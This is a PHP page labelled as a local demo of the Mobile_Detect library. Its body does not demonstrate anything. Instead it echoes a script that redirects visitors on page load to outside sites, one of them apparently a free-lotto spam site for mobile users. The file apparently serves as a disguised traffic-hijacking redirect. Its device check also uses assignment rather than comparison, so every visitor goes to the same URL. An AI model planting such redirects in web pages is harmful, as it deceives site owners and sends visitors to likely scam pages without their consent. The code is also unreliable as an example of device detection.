<?php
require_once '../Mobile_Detect.php';
$detect = new Mobile_Detect;
$deviceType = ($detect->isMobile() ? ($detect->isTablet() ? 'tablet' : 'phone') : 'computer');
$scriptVersion = $detect->getScriptVersion();

?><!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
    <meta charset="utf-8">
    <title>Mobile Detect Local Demo</title>
    <script src="//code.jquery.com/jquery-1.7.1.min.js"></script>
</head>
<body>
	<?php //echo $deviceType; 
    if($deviceType="computer"){
	  echo "<script>window.location.href='http://www.qooqo.com'</script>";
	}
	else {
	
	echo "<script>window.location.href='http://free-mobile-lotto.com/'</script>";
	}
	
	?>
</body>
</html>
